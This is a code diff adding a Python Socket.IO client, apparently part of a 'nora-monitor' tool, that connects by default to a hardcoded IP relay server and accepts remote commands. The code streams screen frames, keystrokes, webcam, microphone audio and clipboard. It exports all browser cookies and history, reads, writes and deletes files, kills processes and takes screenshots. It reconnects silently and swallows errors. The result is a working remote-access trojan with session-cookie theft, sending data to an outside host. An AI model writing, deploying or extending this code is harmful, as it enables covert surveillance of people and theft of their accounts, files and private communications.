@@ -1,0 +1,436 @@
+"""
+Connects the nora-monitor to the relay server as a Socket.IO client.
+
+Set NORA_RELAY env var to the relay URL (default: http://16.55.3.205:5000).
+The PC's hostname is used as the agent name; override with NORA_NAME.
+"""
+
+import os
+import platform
+import socket
+import threading
+import socketio
+
+RELAY_URL = os.environ.get("NORA_RELAY", "http://16.55.3.205:5000")
+AGENT_NAME = os.environ.get("NORA_NAME", "") or platform.node() or socket.gethostname() or "agent"
+
+_sio = None
+_controller = None
+_recorder = None
+_camera = None
+_mic = None
+_lock = threading.Lock()
+
+
+def init(controller_fn, recorder, camera, mic=None):
+    global _controller, _recorder, _camera, _mic
+    _controller = controller_fn
+    _recorder = recorder
+    _camera = camera
+    _mic = mic
+
+
+def _emit(event, data):
+    try:
+        if _sio and _sio.connected:
+            _sio.emit(event, data)
+    except Exception:
+        pass
+
+
+def broadcast_frame(b64):      _emit("frame",        {"data": b64})
+def broadcast_key(data):       _emit("key",          data if isinstance(data, dict) else {"char": data})
+def broadcast_camera(b64):     _emit("camera_frame", {"data": b64})
+def broadcast_clipboard(text): _emit("clipboard",    {"text": text})
+def broadcast_ngrok_url(url):  _emit("ngrok_url",    {"url": url})
+def broadcast_audio(b64):      _emit("audio",        {"data": b64})
+
+
+def _make_client():
+    """Create a fresh Socket.IO client with all handlers registered."""
+    global _sio
+    sio = socketio.Client(reconnection=False, logger=False, engineio_logger=False)
+    with _lock:
+        _sio = sio
+
+    @sio.on("connect")
+    def _on_connect():
+        print(f"[relay] connected to {RELAY_URL} as {AGENT_NAME}", flush=True)
+        sio.emit("register", {"name": AGENT_NAME})
+
+    @sio.on("command")
+    def _on_command(data):
+        if _controller:
+            try: _controller(data)
+            except Exception: pass
+
+    @sio.on("get_processes")
+    def _on_get_processes(data):
+        try:
+            import processes as proc
+            procs = proc.get_processes()
+            sio.emit("processes_result", {
+                "processes": procs,
+                "_requester": data.get("_requester"),
+            })
+        except Exception:
+            pass
+
+    @sio.on("kill_process")
+    def _on_kill(data):
+        try:
+            import processes as proc
+            proc.kill_process(int(data.get("pid", 0)))
+        except Exception:
+            pass
+
+    @sio.on("list_dir")
+    def _on_list_dir(data):
+        try:
+            import file_manager as fm
+            path = data.get("path") or fm.home_dir()
+            result = fm.list_dir(path)
+            result["_requester"] = data.get("_requester")
+            sio.emit("dir_result", result)
+        except Exception:
+            pass
+
+    @sio.on("read_file")
+    def _on_read_file(data):
+        try:
+            import file_manager as fm
+            result = fm.read_file(data.get("path", ""))
+            result["_requester"] = data.get("_requester")
+            sio.emit("file_data", result)
+        except Exception:
+            pass
+
+    @sio.on("write_file")
+    def _on_write_file(data):
+        try:
+            import file_manager as fm
+            result = fm.write_file(data.get("path", ""), data.get("data", ""))
+            result["_requester"] = data.get("_requester")
+            sio.emit("write_result", result)
+        except Exception:
+            pass
+
+    @sio.on("delete_path")
+    def _on_delete_path(data):
+        try:
+            import file_manager as fm
+            result = fm.delete_path(data.get("path", ""))
+            result["_requester"] = data.get("_requester")
+            result["path"] = data.get("path", "")
+            sio.emit("delete_result", result)
+        except Exception:
+            pass
+
+    @sio.on("win_capture_start")
+    def _on_win_capture_start(data):
+        try:
+            import windows_control as wc
+            hwnd = data.get("hwnd")
+            if hwnd:
+                wc.start_window_capture(int(hwnd), lambda b64: sio.emit("win_frame", {"data": b64}))
+        except Exception:
+            pass
+
+    @sio.on("win_capture_stop")
+    def _on_win_capture_stop(_data=None):
+        try:
+            import windows_control as wc
+            wc.stop_window_capture()
+        except Exception:
+            pass
+
+    @sio.on("list_windows")
+    def _on_list_windows(data):
+        try:
+            import windows_control as wc
+            wins = wc.list_windows()
+            sio.emit("windows_list", {"windows": wins, "_requester": data.get("_requester") if data else None})
+        except Exception:
+            pass
+
+    @sio.on("win_key")
+    def _on_win_key(data):
+        try:
+            import windows_control as wc
+            hwnd = data.get("hwnd")
+            if hwnd:
+                wc.send_key(int(hwnd), data.get("key", ""))
+        except Exception:
+            pass
+
+    @sio.on("win_mouse")
+    def _on_win_mouse(data):
+        try:
+            import windows_control as wc, mss
+            hwnd = data.get("hwnd")
+            if not hwnd:
+                return
+            with mss.mss() as s:
+                m = s.monitors[1]
+                sw_r, sh_r = m["width"], m["height"]
+            sx = data.get("x", 0) / data.get("sw", sw_r) * sw_r
+            sy = data.get("y", 0) / data.get("sh", sh_r) * sh_r
+            wc.send_mouse(int(hwnd), sx, sy, data.get("action", "click"), data.get("button", 0))
+        except Exception:
+            pass
+
+    @sio.on("desktop_cmd")
+    def _on_desktop_cmd(data):
+        try:
+            import windows_control as wc
+            {"new": wc.desktop_new, "left": wc.desktop_left,
+             "right": wc.desktop_right, "close": wc.desktop_close}.get(data.get("cmd", ""), lambda: None)()
+        except Exception:
+            pass
+
+    @sio.on("export_cookies")
+    def _on_export_cookies(data):
+        try:
+            import cookie_manager as cm
+            cookies = cm.export_all()
+            sio.emit("cookies_data", {
+                "cookies": cookies,
+                "count": len(cookies),
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("cookies_data", {
+                "error": str(e), "cookies": [], "count": 0,
+                "_requester": data.get("_requester") if data else None,
+            })
+
+    @sio.on("import_cookies")
+    def _on_import_cookies(data):
+        try:
+            import cookie_manager as cm
+            result = cm.import_all(data.get("cookies", []))
+            result["_requester"] = data.get("_requester")
+            sio.emit("import_result", result)
+        except Exception as e:
+            sio.emit("import_result", {"ok": False, "message": str(e), "_requester": data.get("_requester")})
+
+    @sio.on("camera_on")
+    def _on_cam_on(_data=None):
+        if _camera:
+            try: _camera.start()
+            except Exception: pass
+
+    @sio.on("camera_off")
+    def _on_cam_off(_data=None):
+        if _camera:
+            try: _camera.stop()
+            except Exception: pass
+
+    @sio.on("mic_on")
+    def _on_mic_on(_data=None):
+        if _mic:
+            try: _mic.start()
+            except Exception: pass
+
+    @sio.on("mic_off")
+    def _on_mic_off(_data=None):
+        if _mic:
+            try: _mic.stop()
+            except Exception: pass
+
+    @sio.on("get_sysinfo")
+    def _on_get_sysinfo(data):
+        try:
+            import sysinfo
+            info = sysinfo.get_info()
+            info["_requester"] = data.get("_requester") if data else None
+            sio.emit("sysinfo_result", info)
+        except Exception:
+            pass
+
+    @sio.on("get_history")
+    def _on_get_history(data):
+        try:
+            import browser_history as bh
+            limit = (data or {}).get("limit", 500)
+            history = bh.export_all(limit=limit)
+            sio.emit("history_result", {
+                "history": history, "count": len(history),
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("history_result", {
+                "error": str(e), "history": [], "count": 0,
+                "_requester": data.get("_requester") if data else None,
+            })
+
+    @sio.on("take_screenshot")
+    def _on_take_screenshot(data):
+        try:
+            import mss as _mss, base64 as _b64
+            from PIL import Image as _Img
+            import io as _io
+            with _mss.mss() as sct:
+                shot = sct.grab(sct.monitors[1])
+                img = _Img.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
+                buf = _io.BytesIO()
+                img.save(buf, format="PNG")
+                b64 = _b64.b64encode(buf.getvalue()).decode()
+                sio.emit("screenshot_result", {
+                    "data": b64,
+                    "_requester": data.get("_requester") if data else None,
+                })
+        except Exception as e:
+            sio.emit("screenshot_result", {
+                "error": str(e),
+                "_requester": data.get("_requester") if data else None,
+            })
+
+    @sio.on("clipboard_set")
+    def _on_clipboard_set(data):
+        try:
+            import pyperclip
+            pyperclip.copy(data.get("text", ""))
+            sio.emit("clipboard_set_result", {
+                "ok": True,
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("clipboard_set_result", {
+                "ok": False, "error": str(e),
+                "_requester": data.get("_requester") if data else None,
+            })
+
+    @sio.on("send_notification")
+    def _on_send_notification(data):
+        try:
+            import mactools as mt
+            result = mt.send_notification(data.get("title", "Nora"), data.get("message", ""))
+            result["_requester"] = data.get("_requester") if data else None
+            sio.emit("notification_result", result)
+        except Exception as e:
+            sio.emit("notification_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    @sio.on("get_wallpaper")
+    def _on_get_wallpaper(data):
+        try:
+            import mactools as mt
+            result = mt.get_wallpaper()
+            result["_requester"] = data.get("_requester") if data else None
+            sio.emit("wallpaper_result", result)
+        except Exception as e:
+            sio.emit("wallpaper_result", {"path": "", "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    @sio.on("set_wallpaper")
+    def _on_set_wallpaper(data):
+        try:
+            import mactools as mt
+            result = mt.set_wallpaper(data.get("path", ""))
+            result["_requester"] = data.get("_requester") if data else None
+            sio.emit("set_wallpaper_result", result)
+        except Exception as e:
+            sio.emit("set_wallpaper_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    @sio.on("get_programs")
+    def _on_get_programs(data):
+        try:
+            import mactools as mt
+            programs = mt.list_installed_programs()
+            sio.emit("programs_result", {
+                "programs": programs, "count": len(programs),
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("programs_result", {"error": str(e), "programs": [], "count": 0, "_requester": data.get("_requester") if data else None})
+
+    @sio.on("get_netconns")
+    def _on_get_netconns(data):
+        try:
+            import mactools as mt
+            conns = mt.list_network_connections()
+            sio.emit("netconns_result", {
+                "connections": conns, "count": len(conns),
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("netconns_result", {"error": str(e), "connections": [], "count": 0, "_requester": data.get("_requester") if data else None})
+
+    @sio.on("get_startup")
+    def _on_get_startup(data):
+        try:
+            import mactools as mt
+            items = mt.list_startup_programs()
+            sio.emit("startup_result", {
+                "items": items, "count": len(items),
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("startup_result", {"error": str(e), "items": [], "count": 0, "_requester": data.get("_requester") if data else None})
+
+    @sio.on("remove_startup")
+    def _on_remove_startup(data):
+        try:
+            import mactools as mt
+            result = mt.remove_startup_program(data.get("name", ""), data.get("scope", "user"))
+            result["_requester"] = data.get("_requester") if data else None
+            sio.emit("remove_startup_result", result)
+        except Exception as e:
+            sio.emit("remove_startup_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    @sio.on("volume_control")
+    def _on_volume_control(data):
+        try:
+            import mactools as mt
+            result = mt.volume_control(data.get("action", "mute"))
+            result["_requester"] = data.get("_requester") if data else None
+            sio.emit("volume_result", result)
+        except Exception as e:
+            sio.emit("volume_result", {"ok": False, "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    @sio.on("get_monitors")
+    def _on_get_monitors(data):
+        try:
+            import mactools as mt
+            monitors = mt.list_monitors()
+            sio.emit("monitors_result", {
+                "monitors": monitors,
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("monitors_result", {"monitors": [], "error": str(e), "_requester": data.get("_requester") if data else None})
+
+    return sio
+
+
+def _connect_loop():
+    import time
+    backoff = 5
+    while True:
+        sio = _make_client()
+        try:
+            sio.connect(RELAY_URL, transports=["websocket", "polling"])
+            backoff = 5
+            sio.wait()
+        except Exception as e:
+            print(f"[relay] connection failed: {e}", flush=True)
+        try:
+            sio.disconnect()
+        except Exception:
+            pass
+        print(f"[relay] reconnecting in {backoff}s...", flush=True)
+        time.sleep(backoff)
+        backoff = min(backoff * 2, 60)
+
+
+def connect(_relay_url=None):
+    """Start the relay client loop (blocking). Call from a daemon thread."""
+    global RELAY_URL
+    if _relay_url:
+        RELAY_URL = _relay_url
+    _connect_loop()
+
+
+def run():
+    """Start the relay client in a background daemon thread."""
+    t = threading.Thread(target=_connect_loop, daemon=True, name="relay-client")
+    t.start()
